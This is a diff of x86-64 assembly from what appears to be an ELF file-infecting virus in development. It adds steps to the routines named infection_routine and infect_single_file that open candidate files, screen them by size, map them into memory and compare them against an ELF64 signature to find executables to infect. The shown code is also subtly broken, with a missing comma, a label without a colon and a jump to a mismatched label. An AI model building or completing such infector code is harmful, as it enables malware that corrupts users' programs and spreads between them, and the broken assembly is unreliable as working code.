@@ -346,8 +346,8 @@ infection_routine:
     ret
 
 infect_single_file:
-    push r8
-    push r9
+    push r8 ; fd to r8
+    push r9 ; mmap buf to r9
     push r10
 
     mov rax, SYS_OPEN
@@ -368,7 +368,12 @@ infect_single_file:
     syscall
 
     test rax, rax
-    js .ret
+    js .close
+
+    ; if file size < THEO_MIN_SIZE bytes, this couldnt possibly be a program 
+    cmp rax, THEO_MIN_SIZE
+    jle .close
+
 
 	; addr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // NOTE: need to free this using munmap
     ; (rdi, rsi, rdx, rcx, r8, r9)
@@ -381,6 +386,9 @@ infect_single_file:
     mov r9, 0
     mov rax SYS_MMAP
     syscall
+
+    ; rax should have the mmap address and contents....
+    call break
 
     
     ; from file contents, check if its elf64.
@@ -408,6 +416,14 @@ infect_single_file:
     ; jmp exit_ok
 
 
+.close
+    mov rdi, r8
+    mov rax, SYS_CLOSE
+    syscall
+    jmp ret
+
+.munmap
+    jmp ret
 
 .ret:
 	pop r10
@@ -570,13 +586,31 @@ strstrs:
     pop  rbx
     ret
 
+memcmp:
+    xor eax, eax
+    test rdx, rdx
+    jz .done
 
+.loop:
+    movzx eax, byte [rdi]
+    movzx ecx, byte [rsi]
+    sub eax, ecx
+    jnz .done
+
+    inc rdi
+    inc rsi
+    dec rdx
+    jnz .loop
+
+.done:
+    ret
 
 break:
     ret
 ; -----------------------------------data-in-code-------------------------------
 
 dirent_buf times DIRENT_BUF_SZ db 0x0
+elf64_signature db 0x7F, 'E', 'L', 'F', 2
 
 newline db `\n`
 slash db `/`
